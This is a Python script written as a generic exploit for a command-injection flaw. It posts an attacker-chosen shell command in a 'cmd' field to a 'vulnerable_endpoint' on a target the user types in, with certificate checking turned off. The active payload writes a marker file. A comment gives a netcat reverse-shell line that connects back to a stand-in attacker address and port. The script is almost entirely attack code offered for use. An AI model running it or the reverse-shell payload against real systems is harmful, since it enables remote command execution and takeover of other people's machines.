import requests
import sys

# Disable SSL warnings if needed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_payload(target_ip_or_url, target_port, payload):
    url = f"http://{target_ip_or_url}:{target_port}/vulnerable_endpoint"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    data = {
        "cmd": payload  # Vulnerable endpoint expecting 'cmd' param
    }

    try:
        print(f"[+] Sending payload to {url}...")
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] Response: {response.text.strip()}")
        else:
            print(f"[-] Error: HTTP Status Code {response.status_code}")
    except Exception as e:
        print(f"[-] Error sending payload: {e}")

def exploit_vulnerability(target_ip_or_url, target_port):
    # Payload to execute on vulnerable system (e.g., reverse shell)
    # This could be a basic shell command or reverse shell
    payload = "echo 'Vulnerable!' > /tmp/exploit_test"
    
    send_payload(target_ip_or_url, target_port, payload)

    # Optionally, execute commands like:
    # payload = "nc -e /bin/sh attacker_ip attacker_port"  # reverse shell payload

def main():
    # Prompt user for the IP or URL and port of the vulnerable target
    target_ip_or_url = input("Enter the IP or URL of the vulnerable target: ")
    target_port = input("Enter the target port (default 8080): ")
    
    # Set default port if none provided
    if not target_port:
        target_port = 8080
    else:
        target_port = int(target_port)

    # Exploit the vulnerability
    exploit_vulnerability(target_ip_or_url, target_port)

if __name__ == "__main__":
    main()

